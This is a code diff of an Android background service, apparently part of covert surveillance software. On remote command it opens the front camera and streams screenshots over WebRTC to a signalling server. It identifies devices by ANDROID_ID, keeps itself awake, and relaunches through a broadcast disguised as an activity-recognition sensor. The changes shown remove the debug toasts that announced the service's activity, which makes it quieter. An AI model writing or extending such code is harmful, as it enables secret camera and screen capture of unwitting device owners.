@@ -7,13 +7,11 @@ import android.graphics.Bitmap;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.support.annotation.NonNull;
 import android.support.annotation.RequiresApi;
-import android.util.Log;
 import android.widget.Toast;
 
 
@@ -28,7 +26,6 @@ import org.webrtc.DefaultVideoDecoderFactory;
 import org.webrtc.DefaultVideoEncoderFactory;
 import org.webrtc.EglBase;
 import org.webrtc.IceCandidate;
-import org.webrtc.Logging;
 import org.webrtc.MediaConstraints;
 import org.webrtc.MediaStream;
 import org.webrtc.PeerConnection;
@@ -38,8 +35,6 @@ import org.webrtc.VideoCapturer;
 import org.webrtc.VideoSource;
 import org.webrtc.VideoTrack;
 
-import java.io.File;
-import java.io.FileOutputStream;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.ByteBuffer;
@@ -61,7 +56,6 @@ public class sysService extends Service implements SysInterface{
     PeerConnectionFactory peerConnectionFactory;
     MediaConstraints audioConstraints;
     MediaConstraints videoConstraints;
-    MediaConstraints sdpConstraints;
     VideoTrack localVideoTrack;
     AudioTrack localAudioTrack;
     VideoSource videoSource;
@@ -89,8 +83,6 @@ public class sysService extends Service implements SysInterface{
     @Override
     public IBinder onBind(Intent intent) {
         // TODO: Return the communication channel to the service.
-        Toast.makeText(getApplicationContext(),"on bind", Toast.LENGTH_LONG).show();
-
         return null;
     }
 
@@ -98,8 +90,6 @@ public class sysService extends Service implements SysInterface{
     @Override
     public void onCreate() {
         super.onCreate();
-        Toast.makeText(getApplicationContext(),"on create", Toast.LENGTH_LONG).show();
-
         PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
         mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "systemService");
     }
@@ -112,7 +102,6 @@ public class sysService extends Service implements SysInterface{
         handler = new Handler();
         String roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
         SignallingClient.getInstance().init(this, roomName);
-        Toast.makeText(getApplicationContext(),"on start sysService", Toast.LENGTH_LONG).show();
         try {
             if (intent.getExtras()!= null) {
                 Bundle bundle = intent.getExtras();
@@ -131,8 +120,6 @@ public class sysService extends Service implements SysInterface{
     public void onDestroy() {
         super.onDestroy();
         resetSocket();
-        Toast.makeText(getApplicationContext(),"on des", Toast.LENGTH_LONG).show();
-
         Intent broadcastIntent = new Intent("ac.in.ActivityRecognition.RestartSensor");
         sendBroadcast(broadcastIntent);
     }
@@ -153,12 +140,10 @@ public class sysService extends Service implements SysInterface{
     }
     @Override
     public void onOfferReceived(final JSONObject data) {
-        toast("off re");
         runOnUiThread(() -> {
             if (!SignallingClient.getInstance().isInitiator && !SignallingClient.getInstance().isStarted) {
                 onTryToStart();
             }
-
             try {
                 localPeer.setRemoteDescription(new CustomSdpObserver("localSetRemote"), new SessionDescription(SessionDescription.Type.OFFER, data.getString("sdp")));
                 doAnswer();
@@ -170,8 +155,6 @@ public class sysService extends Service implements SysInterface{
 
     @Override
     public void onAnswerReceived(JSONObject data) {
-        toast("ans reciv3d");
-
         try {
             localPeer.setRemoteDescription(new CustomSdpObserver("localSetRemote"), new SessionDescription(SessionDescription.Type.fromCanonicalForm(data.getString("type").toLowerCase()), data.getString("sdp")));
 
@@ -191,7 +174,6 @@ public class sysService extends Service implements SysInterface{
 
     @Override
     public void cmd(String cmd) {
-        //showToast("cmd is: " + cmd + " : " + getserverIp());
         if (cmd.equalsIgnoreCase("openFrontCam") ){
             openPeerCon();
             createCamInstance("front");
@@ -215,9 +197,8 @@ public class sysService extends Service implements SysInterface{
         }
         if (cmd.contains("screenshot")){
             int shotN = Integer.parseInt(cmd.split(":")[1]);
-            toast(shotN+"");
             sendScreenshot(shotN);
-
+            toast("get screenshot");
         }
 
     }
@@ -501,9 +482,7 @@ public class sysService extends Service implements SysInterface{
 
     // screen shot
     public void sendScreenshot(int shotN){
-        toast(shotN+"");
         if (perData != null){
-            toast("from send screen");
             initDataChannel();
             Screenshot.getObj().takeScreenshot(this);
         }else {
@@ -521,9 +500,6 @@ public class sysService extends Service implements SysInterface{
         if (data != null){
             this.perData = data;
             this.perResultCode = resultCode;
-            toast("get media");
-            initDataChannel();
-            Screenshot.getObj().takeScreenshot(this);
         }
     }
 
@@ -544,8 +520,8 @@ public class sysService extends Service implements SysInterface{
                         .createInitializationOptions()
         );
         peerConnectionFactory = new PeerConnectionFactory(null);
-        createPeerConnection("data");
 
+        createPeerConnection("data");
         localDataChannel = localPeer.createDataChannel("sendDataChannel", new DataChannel.Init());
         localDataChannel.registerObserver(new DataChannel.Observer() {
             @Override
